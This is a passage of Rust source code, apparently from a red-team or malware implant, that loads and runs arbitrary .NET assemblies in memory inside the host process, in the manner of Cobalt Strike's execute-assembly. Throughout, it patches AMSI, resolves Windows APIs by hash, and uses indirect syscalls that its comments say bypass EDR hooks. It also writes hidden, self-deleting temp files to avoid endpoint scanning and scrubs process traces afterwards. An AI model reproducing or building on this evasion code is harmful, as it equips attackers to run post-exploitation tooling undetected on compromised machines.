        pe_resolve::get_proc_address_by_hash(
            pe_resolve::HASH_KERNEL32_DLL as usize,
            pe_resolve::hash_str(b"GetStdHandle\0"),
        ).ok_or("cannot resolve GetStdHandle")?
    );
    let set_std_handle: unsafe extern "system" fn(u32, HANDLE) -> i32 = std::mem::transmute(
        pe_resolve::get_proc_address_by_hash(
            pe_resolve::HASH_KERNEL32_DLL as usize,
            pe_resolve::hash_str(b"SetStdHandle\0"),
        ).ok_or("cannot resolve SetStdHandle")?
    );
    const STD_OUTPUT_HANDLE: u32 = 0xFFFFFFF5u32 as u32;
    const STD_ERROR_HANDLE: u32 = 0xFFFFFFF4u32 as u32;

    let orig_stdout = get_std_handle(STD_OUTPUT_HANDLE);
    let orig_stderr = get_std_handle(STD_ERROR_HANDLE);

    let thread_result = std::thread::spawn(move || -> Result<VARIANT, String> {
        // Redirect stdout/stderr to our pipes (on this thread).
        set_std_handle(STD_OUTPUT_HANDLE, ctx.stdout_write);
        set_std_handle(STD_ERROR_HANDLE, ctx.stderr_write);

        let method = &*ctx.method_disp;
        let mut result = VARIANT::empty();
        let mut excep = std::mem::zeroed::<EXCEPINFO>();
        let mut arg_err: u32 = 0;

        let mut params = DISPPARAMS {
            rgvarg: ctx.invoke_args.as_mut_ptr(),
            rgdispid_named_args: std::ptr::null_mut(),
            c_args: 2,
            c_named_args: 0,
        };

        let hr = (method.vtable.invoke)(
            ctx.method_disp as *mut c_void,
            ctx.dispid_invoke,
            IID_NULL.as_ptr(),
            LOCALE_USER_DEFAULT,
            DISPATCH_METHOD,
            &mut params,
            &mut result,
            &mut excep,
            &mut arg_err,
        );

        // Restore original handles before returning.
        set_std_handle(STD_OUTPUT_HANDLE, orig_stdout);
        set_std_handle(STD_ERROR_HANDLE, orig_stderr);

        if hr != S_OK {
            let mut desc = format!("hr={:#010X}", hr as u32);
            if !excep.bstr_description.is_null() {
                let mut chars = Vec::new();
                let mut p = excep.bstr_description;
                for _ in 0..256 {
                    if *p == 0 { break; }
                    chars.push(*p);
                    p = p.add(1);
                }
                if let Some(sys_free) = resolve_oleaut32_fn::<FnSysFreeString>(b"SysFreeString\0") {
                    sys_free(excep.bstr_description);
                }
                desc = format!("{} — {}", String::from_utf16_lossy(&chars), desc);
            }
            Err(format!("MethodInfo.Invoke_2 failed: {}", desc))
        } else {
            Ok(result)
        }
    });

    // ── 9. Wait for thread with timeout ─────────────────────────────────
    let close_handle: FnCloseHandle = resolve_api(
        pe_resolve::HASH_KERNEL32_DLL,
        pe_resolve::hash_str(b"CloseHandle\0"),
    ).ok_or("cannot resolve CloseHandle")?;

    let timeout_ms = timeout_secs * 1000;
    let mut needs_reinit = false;
    let mut invoke_result: Option<VARIANT> = None;

    // Use NtWaitForSingleObject on the thread handle to enforce timeout.
    let exec_raw_handle = thread_result.as_raw_handle();
    let timeout_100ns: i64 = -((timeout_secs as i64) * 10_000_000i64);
    let wait_status = syscall!(
        "NtWaitForSingleObject",
        exec_raw_handle as u64,
        0u64, // Alertable = FALSE
        &timeout_100ns as *const _ as u64,
    );

    let wait_ok = match wait_status {
        Ok(s) if s >= 0 => true,
        _ => false,
    };

    // Check if the thread completed (STATUS_WAIT_0 = 0)
    let thread_completed = wait_ok && wait_status.unwrap() == 0;

    if thread_completed {
        match thread_result.join() {
            Ok(Ok(result)) => {
                invoke_result = Some(result);
            }
            Ok(Err(e)) => {
                log::warn!("[assembly_loader] in-memory invoke failed: {}", e);
            }
            Err(_) => {
                log::warn!("[assembly_loader] in-memory execution thread panicked");
                needs_reinit = true;
            }
        }
    } else {
        // Timeout — forcefully terminate the thread.
        log::warn!(
            "[assembly_loader] in-memory assembly timed out after {}s — terminating CLR thread",
            timeout_secs
        );
        let term_status = syscall!("NtTerminateThread", exec_raw_handle as u64, 0u64);
        match term_status {
            Ok(s) if s >= 0 => {
                log::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
            }
            Ok(s) => {
                log::warn!(
                    "[assembly_loader] NtTerminateThread returned failure 0x{s:08X}"
                );
            }
            Err(e) => {
                log::warn!(
                    "[assembly_loader] NtTerminateThread syscall failed: {e}"
                );
            }
        }
        // Drop the JoinHandle without joining — the thread is already dead.
        // NtClose the OS handle since we've already terminated the thread.
        let _ = syscall!("NtClose", exec_raw_handle as u64);
        std::mem::forget(thread_result);
        needs_reinit = true;
    }

    // Close write ends so read_pipe_to_vec can finish.
    close_handle(stdout_write);
    close_handle(stderr_write);

    // Read captured output.
    let mut output_buf = Vec::new();
    read_pipe_to_vec(stdout_read, &mut output_buf);
    read_pipe_to_vec(stderr_read, &mut output_buf);
    close_handle(stdout_read);
    close_handle(stderr_read);

    let output = String::from_utf8_lossy(&output_buf).to_string();

    // ── 10. Cleanup ─────────────────────────────────────────────────────
    if let Some(mut result) = invoke_result {
        variant_clear(&mut result);
    }

    // Free arg BSTRs.
    for bstr in &arg_bstrs {
        sys_free_string(*bstr);
    }
    if !sa_args.is_null() {
        safe_array_destroy(sa_args);
    }

    // Release MethodInfo, Assembly IDispatch.
    if !method_info.is_null() {
        let md = &*(method_info as *const IDispatch);
        (md.vtable.release)(method_info);
    }
    variant_clear(&mut ep_result);
    variant_clear(&mut assembly_result);

    // Release AppDomain IDispatch + IUnknown.
    let disp = &*appdomain;
    (disp.vtable.release)(appdomain as *mut c_void);
    let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
    (unk.vtable.release)(appdomain_ptr);

    log::info!("[assembly_loader] in-memory: execution complete, {} bytes output", output.len());

    if needs_reinit {
        // Flag CLR for reinit on next call.
        let mut guard = CLR_HOST.lock().map_err(|e| format!("lock: {e}"))?;
        if let Some(ref mut state) = *guard {
            state.needs_reinit = true;
        }
    }

    Ok(AssemblyResult {
        output,
        hresult: S_OK,
    })
}

/// Execute a .NET assembly in-process using the CLR hosting APIs.
///
/// # Arguments
///
/// * `assembly_bytes` — Raw bytes of the .NET assembly PE.  Must be ≤ 10 MB.
/// * `args` — Command-line arguments.  Must be ≤ 32 entries.
/// * `timeout_secs` — Wall-clock timeout.  `None` defaults to 30 s.
///
/// # Returns
///
/// An `AssemblyResult` with captured output and the HRESULT.
///
/// # Safety
///
/// This function uses raw COM pointers, pipe handles, and thread handles.
/// It must only be called on Windows with a valid Win32 process environment.
pub unsafe fn execute(
    assembly_bytes: &[u8],
    args: &[String],
    timeout_secs: Option<u64>,
) -> Result<AssemblyResult, String> {
    // ── Input validation ────────────────────────────────────────────────
    if assembly_bytes.is_empty() {
        return Err("assembly bytes are empty".to_string());
    }
    if assembly_bytes.len() > MAX_ASSEMBLY_SIZE {
        return Err(format!(
            "assembly too large: {} bytes (max {} bytes)",
            assembly_bytes.len(),
            MAX_ASSEMBLY_SIZE
        ));
    }
    if args.len() > MAX_ARGS {
        return Err(format!("too many arguments: {} (max {})", args.len(), MAX_ARGS));
    }

    // ── AMSI bypass ─────────────────────────────────────────────────────
    // Ensure AMSI is patched before we load any managed code.
    crate::amsi_defense::orchestrate_layers();
    if !crate::amsi_defense::verify_bypass() {
        log::warn!("[assembly_loader] AMSI bypass verification failed — proceeding anyway");
    }

    // ── COM initialization (STA) — dynamically resolved ─────────────────
    if !COM_INITIALIZED.load(Ordering::Relaxed) {
        // Ensure ole32.dll is loaded, then resolve CoInitializeEx dynamically.
        let ole32_hash = pe_resolve::hash_wstr(&[
            b'o' as u16, b'l' as u16, b'e' as u16, b'3' as u16, b'2' as u16,
            b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
        ]);
        let ole32_base = match pe_resolve::get_module_handle_by_hash(ole32_hash) {
            Some(base) => base,
            None => {
                // ole32.dll not yet in PEB — load it via resolved LoadLibraryW.
                let load_lib: FnLoadLibraryW = resolve_api(
                    pe_resolve::HASH_KERNEL32_DLL,
                    pe_resolve::hash_str(b"LoadLibraryW\0"),
                ).ok_or("cannot resolve LoadLibraryW for ole32 load")?;
                let name = to_wide("ole32.dll");
                let base = load_lib(name.as_ptr()) as usize;
                if base == 0 {
                    return Err("failed to load ole32.dll".to_string());
                }
                base
            }
        };
        let co_init: FnCoInitializeEx = pe_resolve::get_proc_address_by_hash(
            ole32_base,
            pe_resolve::hash_str(b"CoInitializeEx\0"),
        ).map(|addr| std::mem::transmute::<_, FnCoInitializeEx>(addr))
         .ok_or("cannot resolve CoInitializeEx from ole32.dll")?;

        let hr = co_init(std::ptr::null_mut(), 0x0); // COINIT_APARTMENTTHREADED
        if hr as u32 != S_OK as u32 && hr as u32 != 0x80010106 {
            // S_FALSE (already initialized) is fine.
            log::warn!(
                "[assembly_loader] CoInitializeEx returned {:#010X}",
                hr as u32
            );
        }
        COM_INITIALIZED.store(true, Ordering::Relaxed);
    }

    // ── Start idle watcher ──────────────────────────────────────────────
    ensure_idle_watcher();

    // ── Ensure CLR host is initialized ──────────────────────────────────
    let (runtime_host, cor_host) = {
        let mut guard = CLR_HOST.lock().map_err(|e| format!("CLR_HOST lock poisoned: {e}"))?;
        match *guard {
            Some(ref mut state)
                if state.initialized && !state.runtime_host.is_null() && !state.needs_reinit =>
            {
                state.last_used = Instant::now();
                (state.runtime_host, state.cor_host)
            }
            Some(ref mut state) if state.initialized && state.needs_reinit => {
                // CLR was left in a potentially inconsistent state after a
                // forced thread termination.  Tear it down and re-create.
                log::warn!(
                    "[assembly_loader] CLR host flagged for reinit — tearing down and re-creating"
                );
                unsafe {
                    teardown_clr_host(state);
                }
                state.initialized = false;
                state.needs_reinit = false;
                let (rh, ch) = init_clr_host()?;
                *state = ClrHostState {
                    mscoree: std::ptr::null_mut(),
                    runtime_host: rh,
                    cor_host: ch,
                    create_instance_fn: None,
                    last_used: Instant::now(),
                    initialized: true,
                    needs_reinit: false,
                };
                (rh, ch)
            }
            _ => {
                let (rh, ch) = init_clr_host()?;
                *guard = Some(ClrHostState {
                    mscoree: std::ptr::null_mut(), // tracked but not needed after init
                    runtime_host: rh,
                    cor_host: ch,
                    create_instance_fn: None,
                    last_used: Instant::now(),
                    initialized: true,
                    needs_reinit: false,
                });
                (rh, ch)
            }
        }
    };

    // ── Try in-memory loading first ─────────────────────────────────────
    //
    // If ICorRuntimeHost was obtained, attempt to load the assembly from
    // memory via IDispatch late binding (AppDomain.Load_3 + EntryPoint.Invoke).
    // This avoids the temp file write entirely — no disk artifact at all.
    //
    // If in-memory loading fails or is unavailable, fall through to the
    // existing file-based ExecuteInDefaultAppDomain path.
    if !cor_host.is_null() {
        log::info!(
            "[assembly_loader] attempting in-memory assembly loading (no disk write)"
        );
        match execute_in_memory_internal(
            cor_host,
            assembly_bytes,
            args,
            timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS),
        ) {
            Ok(result) => {
                log::info!("[assembly_loader] in-memory execution succeeded");
                return Ok(result);
            }
            Err(e) => {
                log::warn!(
                    "[assembly_loader] in-memory loading failed ({}), falling back to file-based path",
                    e
                );
                // Fall through to file-based path below.
            }
        }
    } else {
        log::info!(
            "[assembly_loader] ICorRuntimeHost not available, using file-based path"
        );
    }

    // ── Write assembly to NT-native temp file (fallback path) ────────
    // ExecuteInDefaultAppDomain requires a file path, so we must have a real
    // file.  This is the fallback when in-memory loading is unavailable.
    // We avoid kernel32 file I/O entirely by using NtCreateFile
    // + NtWriteFile via indirect syscalls.  Key OPSEC improvements:
    //
    // 1. FILE_ATTRIBUTE_TEMPORARY — cache manager hint to keep in memory, avoid
    //    flushing to disk where EDR file-system minifilters can scan it.
    // 2. FILE_DELETE_ON_CLOSE — OS auto-deletes the file when all handles close,
    //    eliminating the window between execution and explicit remove_file.
    // 3. FILE_ATTRIBUTE_HIDDEN — reduces visibility in directory listings.
    // 4. NtCreateFile/NtWriteFile bypass kernel32 EDR hooks on CreateFileW/WriteFile.
    //
    // NT file I/O constants
    const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
    const SYNCHRONIZE: u32 = 0x00100000;
    const GENERIC_WRITE: u32 = 0x40000000;
    const GENERIC_READ: u32 = 0x80000000;
    const FILE_SHARE_READ: u32 = 0x00000001;
    const FILE_SHARE_WRITE: u32 = 0x00000002;
    const FILE_SHARE_DELETE: u32 = 0x00000004;
    const FILE_SUPERSEDE: u32 = 0x00000000;
    const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
    const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
    const FILE_DELETE_ON_CLOSE: u32 = 0x00001000;
    const FILE_ATTRIBUTE_TEMPORARY: u32 = 0x00000100;
    const FILE_ATTRIBUTE_HIDDEN: u32 = 0x00000002;

    let file_uuid = uuid::Uuid::new_v4();
    let temp_dir = std::env::temp_dir();
    let temp_file = temp_dir.join(format!("{file_uuid}.dll"));

    // Convert Win32 path to NT path format: C:\... → \??\C:\...
    let win32_str = temp_file.to_str().ok_or_else(|| "temp path is not valid UTF-8".to_string())?;
    let nt_path_str = format!(r"\??\{win32_str}");
    let mut nt_path_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();

    let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
        Length: ((nt_path_wide.len() - 1) * 2) as u16,
        MaximumLength: (nt_path_wide.len() * 2) as u16,
        Buffer: nt_path_wide.as_mut_ptr(),
    };
    let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
        Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: std::ptr::null_mut(),
        ObjectName: &mut obj_name,
        Attributes: OBJ_CASE_INSENSITIVE,
        SecurityDescriptor: std::ptr::null_mut(),
        SecurityQualityOfService: std::ptr::null_mut(),
    };
    let mut io_status: [u64; 2] = [0; 2];
    let mut h_file: usize = 0;

    let create_status = syscall!(
        "NtCreateFile",
        &mut h_file as *mut _ as u64,          // FileHandle
        (SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ) as u64, // DesiredAccess
        &mut obj_attr as *mut _ as u64,        // ObjectAttributes
        io_status.as_mut_ptr() as u64,         // IoStatusBlock
        0u64,                                   // AllocationSize (null)
        (FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN) as u64, // FileAttributes
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64, // ShareAccess
        FILE_SUPERSEDE as u64,                 // CreateDisposition
        (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE) as u64, // CreateOptions
        0u64,                                   // EaBuffer
        0u64,                                   // EaLength
    );
    if create_status.is_err() || create_status.as_ref().map(|s| *s).unwrap_or(-1) < 0 {
        return Err(format!(
            "NtCreateFile for temp assembly failed: status {:?}",
            create_status
        ));
    }

    // Write assembly bytes via NtWriteFile (indirect syscall, no kernel32 hook).
    let mut offset: usize = 0;
    while offset < assembly_bytes.len() {
        let chunk = &assembly_bytes[offset..];
        let write_status = syscall!(
            "NtWriteFile",
            h_file as u64,                       // FileHandle
            0u64,                                 // Event
            0u64,                                 // ApcRoutine
            0u64,                                 // ApcContext
            io_status.as_mut_ptr() as u64,       // IoStatusBlock
            chunk.as_ptr() as u64,               // Buffer
            chunk.len().min(u32::MAX as usize) as u64, // Length
            &offset as *const _ as u64,          // ByteOffset
            0u64,                                 // Key
        );
        if write_status.is_err() || write_status.as_ref().map(|s| *s).unwrap_or(-1) < 0 {
            let _ = syscall!("NtClose", h_file as u64);
            return Err(format!(
                "NtWriteFile for temp assembly failed at offset {offset}: status {:?}",
                write_status
            ));
        }
        let bytes_written = io_status[0] as u32;
        if bytes_written == 0 {
            let _ = syscall!("NtClose", h_file as u64);
            return Err("NtWriteFile wrote 0 bytes — disk full?".to_string());
        }
        offset += bytes_written as usize;
    }

    let assembly_path = to_wide(win32_str);

    // ── Build argument string ───────────────────────────────────────────
    // ExecuteInDefaultAppDomain passes a single LPCWSTR as the argument.
    // We join args with spaces, matching the standard behavior.
    let args_str = args.join(" ");
    let args_wide = to_wide(&args_str);

    // ── Pipe redirection for stdout/stderr ──────────────────────────────
    let mut sa = SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as DWORD,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle: 1,
    };

    let mut stdout_read: HANDLE = std::ptr::null_mut();
    let mut stdout_write: HANDLE = std::ptr::null_mut();
    let mut stderr_read: HANDLE = std::ptr::null_mut();
    let mut stderr_write: HANDLE = std::ptr::null_mut();

    let create_pipe: FnCreatePipe = resolve_api(
        pe_resolve::HASH_KERNEL32_DLL,
        pe_resolve::hash_str(b"CreatePipe\0"),
    ).ok_or("cannot resolve CreatePipe")?;

    if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
        let _ = syscall!("NtClose", h_file as u64);
        return Err("CreatePipe(stdout) failed".to_string());
    }
    if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
        let _ = syscall!("NtClose", stdout_read as u64);
        let _ = syscall!("NtClose", stdout_write as u64);
        let _ = syscall!("NtClose", h_file as u64);
        return Err("CreatePipe(stderr) failed".to_string());
    }

    // ── Managed method parameters ───────────────────────────────────────
    // We invoke a well-known entry point: the assembly's `Main` method.
    // The type name is the assembly's simple name (filename without extension).
    // This matches how Cobalt Strike's execute-assembly works: it calls
    // ExecuteInDefaultAppDomain with the assembly path, a type name derived
    // from the assembly, and "Execute" as the method name.
    //
    // However, most .NET assemblies use the standard `Main` entry point.
    // To support arbitrary assemblies, we use a helper approach:
    // ExecuteInDefaultAppDomain calls a static method that takes the assembly
    // path and args, loads the assembly via Assembly.Load, and invokes its
    // entry point.  But that requires a bootstrap DLL.
    //
    // Resolve the entry-point type name from .NET CLI metadata rather than
    // guessing based on the assembly filename (which is a random UUID and
    // therefore never matches any managed type).
    let type_name_str = extract_entry_point_type_name(assembly_bytes);
    let type_name = to_wide(&type_name_str);
    let method_name = to_wide("Main");

    // ── Execute with timeout ────────────────────────────────────────────
    let timeout = timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS);
    let host = &*runtime_host;

    let create_event_w: FnCreateEventW = resolve_api(
        pe_resolve::HASH_KERNEL32_DLL,
        pe_resolve::hash_str(b"CreateEventW\0"),
    ).ok_or("cannot resolve CreateEventW")?;

    let timeout_event = create_event_w(std::ptr::null_mut(), 1, 0, std::ptr::null_mut());
    if timeout_event.is_null() {
        let _ = syscall!("NtClose", stdout_read as u64);
        let _ = syscall!("NtClose", stdout_write as u64);
        let _ = syscall!("NtClose", stderr_read as u64);
        let _ = syscall!("NtClose", stderr_write as u64);
        let _ = syscall!("NtClose", h_file as u64);
        return Err("CreateEvent for timeout failed".to_string());
    }

    // Spawn the execution on a separate thread so we can enforce timeout.
    let exec_runtime_host = runtime_host as *mut c_void;
    let exec_assembly_path = assembly_path.clone();
    let exec_type_name = type_name.clone();
    let exec_method_name = method_name.clone();
    let exec_args_wide = args_wide.clone();

    // We'll use a simpler approach: call ExecuteInDefaultAppDomain on the
    // current thread, but wrap it in a wait with timeout using a helper thread.

    let (result_tx, result_rx) = std::sync::mpsc::channel::<(HRESULT, DWORD)>();

    let exec_thread = std::thread::Builder::new()
        .name("clr-exec".to_string())
        .spawn(move || {
            let mut return_val: DWORD = 0;
            let host = &*(exec_runtime_host as *const ICLRRuntimeHost);
            let hr = (host.vtable.execute_in_default_app_domain)(
                exec_runtime_host,
                exec_assembly_path.as_ptr(),
                exec_type_name.as_ptr(),
                exec_method_name.as_ptr(),
                exec_args_wide.as_ptr(),
                &mut return_val,
            );
            let _ = result_tx.send((hr, return_val));
        })
        .map_err(|e| format!("spawn exec thread: {e}"))?;

    // Wait with timeout.
    let exec_handle = exec_thread.as_raw_handle();
    let wait_result = unsafe {
        // NtWaitForSingleObject with timeout in 100ns units (negative = relative).
        let timeout_100ns: i64 = -((timeout * 1000) as i64 * 10_000_000i64);
        let status = syscall!(
            "NtWaitForSingleObject",
            exec_handle as u64,
            0u64, // Alertable = FALSE
            &timeout_100ns as *const _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            0xFFFFFFFFu32 // WAIT_FAILED equivalent
        } else {
            status.unwrap() as u32
        }
    };

    let mut captured_output = Vec::new();

    // Read all available pipe data.
    let _ = read_pipe_to_vec(stdout_read, &mut captured_output);
    let _ = read_pipe_to_vec(stderr_read, &mut captured_output);

    let (hr, _return_val) = if wait_result == WAIT_OBJECT_0 {
        // Thread completed.
        match result_rx.recv() {
            Ok(result) => result,
            Err(_) => (E_EXECUTION_FAILED, 0),
        }
    } else {
        // Timeout — the thread is still running.  Forcefully terminate it via
        // NtTerminateThread to prevent a rogue assembly from continuing to
        // execute (network traffic, file modifications, resource consumption).
        //
        // OPSEC WARNING: NtTerminateThread does not cleanly unwind the
        // thread's stack or release any locks the CLR may hold.  The CLR
        // runtime is now in a potentially inconsistent state.  We flag it
        // for reinitialization so the next execute() call tears it down and
        // rebuilds it from scratch.
        log::warn!(
            "[assembly_loader] assembly timed out after {}s — forcefully terminating CLR thread",
            timeout
        );

        // NtTerminateThread(HANDLE ThreadHandle, NTSTATUS ExitStatus)
        let term_status = syscall!("NtTerminateThread", exec_handle as u64, 0u64);
        match term_status {
            Ok(s) if s >= 0 => {
                log::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
            }
            Ok(s) => {
                log::warn!(
                    "[assembly_loader] NtTerminateThread returned failure 0x{s:08X} — CLR thread may still be running"
                );
            }
            Err(e) => {
                log::warn!(
                    "[assembly_loader] NtTerminateThread syscall failed: {e} — CLR thread may still be running"
                );
            }
        }

        // Close the thread handle now that we've terminated it.
        let _ = syscall!("NtClose", exec_handle as u64);

        // Flag CLR host for reinit on next execution.
        if let Ok(mut guard) = CLR_HOST.lock() {
            if let Some(ref mut state) = *guard {
                state.needs_reinit = true;
                log::info!("[assembly_loader] CLR host flagged for reinit due to forced thread termination");
            }
        }

        (E_TIMEOUT, 0)
    };

    // ── Cleanup ─────────────────────────────────────────────────────────
    let _ = syscall!("NtClose", stdout_read as u64);
    let _ = syscall!("NtClose", stdout_write as u64);
    let _ = syscall!("NtClose", stderr_read as u64);
    let _ = syscall!("NtClose", stderr_write as u64);
    if !timeout_event.is_null() {
        let _ = syscall!("NtClose", timeout_event as u64);
    }

    // Drop the exec thread join handle.  On the success path the thread has
    // already exited, so this just releases the join handle.  On the timeout
    // path we already called NtTerminateThread + NtClose on the raw handle
    // above, so dropping the JoinHandle is a no-op (the OS thread is gone).
    drop(exec_thread);

    // Close the NT file handle.  FILE_DELETE_ON_CLOSE auto-deletes the file
    // now that all handles (ours + CLR's) have been closed.
    let _ = syscall!("NtClose", h_file as u64);

    // Apply memory hygiene.
    crate::memory_hygiene::scrub_peb_traces();

    // Update last-used timestamp.
    if let Ok(mut guard) = CLR_HOST.lock() {
        if let Some(ref mut state) = *guard {
            state.last_used = Instant::now();
        }
    }

    let output = String::from_utf8_lossy(&captured_output).to_string();
    Ok(AssemblyResult { output, hresult: hr })
}

// ── Error codes ──────────────────────────────────────────────────────────────

const E_TIMEOUT: HRESULT = 0x8000_0005; // E_FAIL, repurposed for timeout
const E_EXECUTION_FAILED: HRESULT = 0x8000_4005; // E_ABORT

// ── Handle wrapper for thread JoinHandle ─────────────────────────────────────

trait AsRawHandle {
    fn as_raw_handle(&self) -> HANDLE;
}

impl<T> AsRawHandle for std::thread::JoinHandle<T> {
    fn as_raw_handle(&self) -> HANDLE {
        use std::os::windows::io::AsRawHandle;
        self.as_raw_handle()
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn version_parsing() {
        assert_eq!(parse_version_to_u32("4.0.30319"), 4_030_319);
        assert_eq!(parse_version_to_u32("4.0.30319.42000"), 4_030_319);
        assert_eq!(parse_version_to_u32("2.0.50727"), 2_050_727);
        assert_eq!(parse_version_to_u32("4"), 4_000_000);
        assert_eq!(parse_version_to_u32(""), 0);
    }

    #[test]
    fn input_validation_rejects_oversized_assembly() {
        let big = vec![0u8; MAX_ASSEMBLY_SIZE + 1];
        let result = unsafe { execute(&big, &[], None) };
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too large"));
    }

    #[test]
    fn input_validation_rejects_too_many_args() {
        let args: Vec<String> = (0..MAX_ARGS + 1).map(|i| format!("arg{}", i)).collect();
        let result = unsafe { execute(&[0u8; 100], &args, None) };
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too many arguments"));
    }
}
